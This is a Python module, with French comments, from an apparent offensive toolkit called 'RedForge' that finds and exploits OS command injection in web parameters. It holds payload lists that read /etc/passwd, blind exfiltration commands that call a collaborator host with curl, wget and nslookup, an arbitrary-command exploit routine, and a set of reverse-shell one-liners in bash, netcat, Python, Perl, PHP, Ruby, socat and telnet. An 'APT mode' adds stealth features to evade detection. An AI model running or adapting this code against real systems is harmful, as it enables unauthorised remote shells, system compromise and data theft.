#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection de commandes pour RedForge
Détecte et exploite les vulnérabilités d'exécution de commandes système
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class CommandInjectionConfig:
    """Configuration avancée pour l'injection de commandes"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 50
    timeout: int = 10
    time_based_delay: int = 5
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_os: bool = True
    test_out_of_band: bool = True
    test_time_based: bool = True
    max_time_delay: int = 10


class CommandInjection:
    """Détection et exploitation avancée des injections de commandes"""
    
    def __init__(self, config: Optional[CommandInjectionConfig] = None):
        """
        Initialise le détecteur d'injection de commandes
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or CommandInjectionConfig()
        
        # Payloads d'injection organisés par catégorie
        self.payloads = self._generate_payloads()
        
        # Signatures de succès
        self.success_signatures = {
            "passwd": r'root:x:\d+:\d+:|daemon:x:\d+:\d+:|bin:x:\d+:\d+:',
            "id": r'uid=\d+\([^\)]+\) gid=\d+\([^\)]+\)',
            "whoami": r'^[a-z_][a-z0-9_-]*$',
            "win_ini": r'\[fonts\]|\[extensions\]|\[mci extensions\]',
            "echo": r'CMD_INJ_TEST_[A-Z0-9]+',
            "hostname": r'^[a-zA-Z0-9\.\-]+$',
            "pwd": r'^\/[a-zA-Z0-9\/_-]+$',
            "ls": r'^[a-zA-Z0-9\_\-\.\s]+$'
        }
        
        # Patterns de détection OS
        self.os_patterns = {
            "unix": [
                r'root:x:\d+:\d+:', r'/bin/bash', r'/etc/passwd',
                r'uid=\d+\(', r'grep', r'sed', r'awk'
            ],
            "windows": [
                r'C:\\', r'\\Windows\\', r'\\Program Files',
                r'\[fonts\]', r'\[extensions\]', r'%USERNAME%'
            ]
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> Dict[str, List[str]]:
        """Génère une liste complète de payloads d'injection"""
        payloads = {
            "Basic Unix": [
                "; ls", "| ls", "|| ls", "& ls", "&& ls",
                "$(ls)", "`ls`", "; cat /etc/passwd", "| cat /etc/passwd",
                "; id", "| whoami", "; pwd", "| hostname"
            ],
            "Basic Windows": [
                "& dir", "| dir", "& echo %USERNAME%", "| whoami",
                "& type C:\\Windows\\win.ini", "| systeminfo",
                "& ipconfig", "| net user"
            ],
            "Time Based": [
                "; sleep 5", "| sleep 5", "& sleep 5", "&& sleep 5",
                "$(sleep 5)", "`sleep 5`", "; ping -c 5 127.0.0.1",
                "| timeout 5", "& ping -n 5 127.0.0.1"
            ],
            "Output Based": [
                "; echo CMD_INJ_TEST_{unique}",
                "| echo CMD_INJ_TEST_{unique}",
                "& echo CMD_INJ_TEST_{unique}",
                "$(echo CMD_INJ_TEST_{unique})",
                "`echo CMD_INJ_TEST_{unique}`"
            ],
            "Blind": [
                "; nslookup {collaborator}", "| curl http://{collaborator}",
                "& wget http://{collaborator}", "$(dig {collaborator})",
                "; ping -c 1 {collaborator}"
            ],
            "Encoded": [
                "; bHM=",  # base64 'ls'
                "| Y2F0IC9ldGMvcGFzc3dk",  # base64 'cat /etc/passwd'
                "& ZWNobyAlVVNFUk5BTUUl",  # base64 'echo %USERNAME%'
            ],
            "Advanced Bypass": [
                "; {cmd}", "| {cmd}", "|| {cmd}", "& {cmd}", "&& {cmd}",
                "$({cmd})", "`{cmd}`", "%0a{cmd}", "%0d{cmd}",
                ";{cmd};", "|{cmd}|", "&{cmd}&"
            ]
        }
        
        # Ajouter des variations uniques pour les payloads output based
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        output_payloads = []
        for p in payloads["Output Based"]:
            output_payloads.append(p.replace("{unique}", unique_id))
        payloads["Output Based"] = output_payloads
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection de commandes
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - timeout: Timeout en secondes
                - delay: Délai pour time-based detection
                - collaborator: Domaine collaborator pour blind injection
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections de commandes sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        timeout = kwargs.get('timeout', self.config.timeout)
        delay = kwargs.get('delay', self.config.time_based_delay)
        collaborator = kwargs.get('collaborator')
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            param_vulns = self._test_parameter(target, param, timeout, delay, collaborator)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    print(f"      ✓ Injection commande: {param} -> {vuln['payload'][:40]}...")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'timeout' in kwargs:
            self.config.timeout = kwargs['timeout']
        if 'delay' in kwargs:
            self.config.time_based_delay = kwargs['delay']
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_payloads = min(self.config.max_payloads, 20)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['cmd', 'command', 'exec', 'execute', 'ping', 'nslookup', 
                     'dig', 'host', 'ip', 'url', 'path', 'file', 'dir', 
                     'folder', 'archive', 'backup', 'restore']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_parameter(self, target: str, param: str, timeout: int, 
                        delay: int, collaborator: Optional[str]) -> List[Dict[str, Any]]:
        """Teste un paramètre pour les injections de commandes"""
        vulnerabilities = []
        payloads_tested = 0
        
        for category, payload_list in self.payloads.items():
            for payload in payload_list[:self.config.max_payloads]:
                # Remplacer les placeholders
                test_payload = payload
                if collaborator and '{collaborator}' in test_payload:
                    test_payload = test_payload.replace('{collaborator}', collaborator)
                
                # Pause entre les tests
                if self.config.random_delays and payloads_tested > 0:
                    time.sleep(random.uniform(0.3, 0.8))
                
                result = self._test_payload(target, param, test_payload, timeout, delay)
                self.payloads_tested += 1
                payloads_tested += 1
                
                if result['vulnerable']:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": test_payload[:80] + "..." if len(test_payload) > 80 else test_payload,
                        "category": category,
                        "type": result['type'],
                        "severity": "CRITICAL",
                        "evidence": result['evidence'],
                        "os_type": result.get('os_type', 'unknown'),
                        "risk_score": 95
                    })
                    return vulnerabilities  # Arrêter pour ce paramètre
        
        return vulnerabilities
    
    def _test_payload(self, target: str, param: str, payload: str, 
                      timeout: int, delay: int) -> Dict[str, Any]:
        """Teste un payload d'injection"""
        result = {
            'vulnerable': False,
            'type': 'unknown',
            'evidence': '',
            'os_type': None
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            original_value = query_params[param][0]
            query_params[param] = [original_value + payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            start_time = time.time()
            response = requests.get(test_url, headers=headers, timeout=timeout, verify=False)
            elapsed_time = time.time() - start_time
            
            # Vérifier les signatures
            for sig_name, sig_pattern in self.success_signatures.items():
                if re.search(sig_pattern, response.text, re.IGNORECASE | re.MULTILINE):
                    result['vulnerable'] = True
                    result['type'] = 'output_based'
                    result['evidence'] = sig_name
                    break
            
            # Time-based detection
            if self.config.test_time_based and any(x in payload for x in ['sleep', 'ping', 'timeout']):
                if elapsed_time >= delay:
                    result['vulnerable'] = True
                    result['type'] = 'time_based'
                    result['evidence'] = f"Delay: {elapsed_time:.2f}s"
            
            # Détection OS
            if self.config.detect_os:
                for os_type, patterns in self.os_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            result['os_type'] = os_type
                            break
                    if result['os_type']:
                        break
                
        except requests.Timeout:
            if self.config.test_time_based and any(x in payload for x in ['sleep', 'ping', 'timeout']):
                result['vulnerable'] = True
                result['type'] = 'time_based'
                result['evidence'] = 'Request timeout'
        
        except Exception:
            pass
        
        return result
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "time_based_detection": self.config.test_time_based
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection de commande détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "output_based": len([v for v in vulnerabilities if v['type'] == 'output_based']),
                "time_based": len([v for v in vulnerabilities if v['type'] == 'time_based'])
            },
            "by_os": {
                "unix": len([v for v in vulnerabilities if v['os_type'] == 'unix']),
                "windows": len([v for v in vulnerabilities if v['os_type'] == 'windows'])
            },
            "critical": len(vulnerabilities)
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Ne jamais utiliser les entrées utilisateur dans les commandes système")
            recommendations.add("Utiliser des API sécurisées au lieu d'exécuter des commandes shell")
            recommendations.add("Échapper/stériliser toutes les entrées utilisateur")
        
        if any(v['type'] == 'output_based' for v in vulnerabilities):
            recommendations.add("Désactiver l'affichage des sorties de commandes")
        
        if any(v['type'] == 'time_based' for v in vulnerabilities):
            recommendations.add("Implémenter des timeouts stricts sur les opérations système")
        
        return list(recommendations)
    
    def exploit(self, target: str, param: str, command: str, 
                separator: Optional[str] = None) -> Dict[str, Any]:
        """
        Exploite une injection de commandes
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            command: Commande à exécuter
            separator: Séparateur spécifique (auto-détection si None)
        """
        result = {
            "success": False,
            "command": command,
            "output": "",
            "separator_used": None
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if separator:
            separators = [separator]
        else:
            separators = [';', '|', '||', '&', '&&', '$(', '`', '%0a', '%0d']
        
        for sep in separators:
            test_payload = f"{sep} {command}"
            
            if param in query_params:
                original_value = query_params[param][0]
                query_params[param] = [original_value + test_payload]
            else:
                query_params[param] = [test_payload]
            
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            try:
                headers = self._get_stealth_headers()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if len(response.text) > 0:
                    result["success"] = True
                    result["output"] = response.text[:10000]
                    result["separator_used"] = sep
                    break
                    
            except Exception:
                continue
        
        return result
    
    def get_reverse_shell(self, target: str, param: str, 
                          lhost: str, lport: int) -> Dict[str, Any]:
        """
        Tente d'obtenir un reverse shell via injection de commandes
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            lhost: IP du listener
            lport: Port du listener
        """
        reverse_payloads = [
            # Bash
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            # Netcat
            f"nc -e /bin/sh {lhost} {lport}",
            f"nc -e /bin/bash {lhost} {lport}",
            f"nc {lhost} {lport} -e /bin/sh",
            # Python
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
            # Perl
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            # PHP
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            # Ruby
            f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            # Socat
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            # Telnet
            f"telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport}"
        ]
        
        for payload in reverse_payloads:
            result = self.exploit(target, param, payload)
            if result["success"]:
                result["payload_used"] = payload
                return result
        
        return {"success": False, "error": "Aucun reverse shell n'a fonctionné"}
    
    def execute_blind_command(self, target: str, param: str, command: str,
                               collaborator: str) -> Dict[str, Any]:
        """
        Exécute une commande en mode blind via collaborator
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            command: Commande à exécuter
            collaborator: Domaine collaborator
        """
        result = {
            "success": False,
            "command": command,
            "collaborator": collaborator
        }
        
        # Construire le payload pour exfiltration
        exfil_payloads = [
            f"nslookup $(echo {command} | base64).{collaborator}",
            f"curl http://{collaborator}/$(hostname)",
            f"wget http://{collaborator}/$(whoami)",
            f"dig $(echo {command} | base64).{collaborator}",
            f"ping -c 1 $(hostname).{collaborator}"
        ]
        
        for payload in exfil_payloads:
            test_result = self._test_payload(target, param, payload, 5, 0)
            if test_result['vulnerable']:
                result["success"] = True
                result["payload_used"] = payload
                break
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = CommandInjection()
    results = injection.scan("https://example.com/page?cmd=test")
    print(f"Vulnérabilités: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = CommandInjectionConfig(apt_mode=True, max_payloads=20)
    injection_apt = CommandInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/page?cmd=test", apt_mode=True)
    print(f"Vulnérabilités (APT): {results_apt['count']}")
    
    # Exemple d'exploitation
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        exploit_result = injection_apt.exploit(
            "https://example.com/page",
            vuln['parameter'],
            "id"
        )
        if exploit_result['success']:
            print(f"Exploit réussi: {exploit_result['output'][:200]}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")